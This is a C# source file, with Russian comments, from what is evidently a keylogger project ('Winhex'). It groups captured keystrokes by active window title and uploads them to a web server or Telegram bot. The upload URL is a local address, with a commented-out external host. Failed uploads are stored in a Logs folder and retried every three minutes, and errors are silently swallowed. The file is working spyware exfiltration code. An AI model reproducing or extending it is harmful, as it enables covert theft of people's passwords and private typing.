using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using Winhex.Interfaces;
using Timer = System.Timers.Timer;

namespace Winhex.Models
{
    public class UserLogCreator : ILogCreator
    {
        private UserAction _lastAction;
        private UserLog _currentUserLog;
        private ConcurrentQueue<KeyItem> cq;
        private ILogSender _logSender;

        private Timer _filesSender;

        public UserLogCreator()
        {
            Directory.CreateDirectory("Logs");

            
            switch (Config.LoadConfig().SendingMode)
            {
                case SendingMode.ToWebServer:
                    _logSender = new WebSender();
                    break;
                case SendingMode.ToTgBot:
                    _logSender = new TgBotSender();
                    break;
            }

            _currentUserLog = new UserLog();
            _lastAction = new UserAction();
            cq = new ConcurrentQueue<KeyItem>();

            _filesSender = new Timer(3 * 60 * 1000);
            _filesSender.Elapsed += _filesSender_Elapsed;
            _filesSender.Start();

            StartAddKeys();
        }

        /// <summary>
        /// Начало проверки символов в очереди
        /// </summary>
        private void StartAddKeys()
        {
            Task.Run(() =>
            {
                while (true)
                {
                    try
                    {
                        if (cq.TryDequeue(out var item))
                        {
                            string appTitle = item.Title;
                            char key = item.Key;

                            // Если заголовок поменялся, то отсылаем на сервер объект лога 
                            if (!appTitle.Equals(_lastAction.AppTitle))
                            {
                                if (_lastAction.TextLog.Length != 0)
                                    _currentUserLog.Logs.Add(_lastAction);

                                // Если не отправилось, сохраняем в файл, потом таймер отправит, когда наладится соединение
                                if (!_logSender.SendToServer(_currentUserLog, "http://127.0.0.1:4545/upload"))   //"http://www.ihih.somee.com/upload"))
                                    SaveToFile(_currentUserLog);

                                _currentUserLog = new UserLog();
                                _lastAction = new UserAction() { ActionDateTime = DateTime.Now, AppTitle = appTitle };
                            }

                            // анализ бэкспейса
                            if (key == '`') _lastAction.TextLog += " [bs] ";
                            else _lastAction.TextLog += key;
                        }
                    }
                    catch { }
                    Thread.Sleep(50);
                }
            });
        }

        /// <summary>
        /// Отсылает все логи из папки Logs на сервер
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void _filesSender_Elapsed(object sender, ElapsedEventArgs e)
        {
            try
            {

                var files = Directory.GetFiles("Logs");

                foreach (var file in files)
                {
                    if (_logSender.SendToServer(JsonConvert.DeserializeObject<UserLog>(File.ReadAllText(file)),
                        "http://127.0.0.1:4545/upload"))    //"http://www.ihih.somee.com/upload"))
                        File.Delete(file);
                }
            }
            catch { }
        }

        /// <summary>
        /// Добавить символ в очередь обработки
        /// </summary>
        /// <param name="appTitle"></param>
        /// <param name="key"></param>
        public void AddKey(string appTitle, char key)
        {
            cq.Enqueue(new KeyItem() { Title = appTitle, Key = key });
        }

        private static void SaveToFile(UserLog log)
        {
            try
            {
                File.WriteAllText($"Logs/{Path.GetRandomFileName()}", JsonConvert.SerializeObject(log));
            }
            catch { }
        }

        public void Close()
        {
            if (!_logSender.SendToServer(_currentUserLog, "http://127.0.0.1:4545/upload"))   //"http://www.ihih.somee.com/upload"))
                SaveToFile(_currentUserLog);
            _filesSender.Stop();
        }
    }

    internal struct KeyItem
    {
        public string Title { get; set; }
        public char Key { get; set; }
    }
}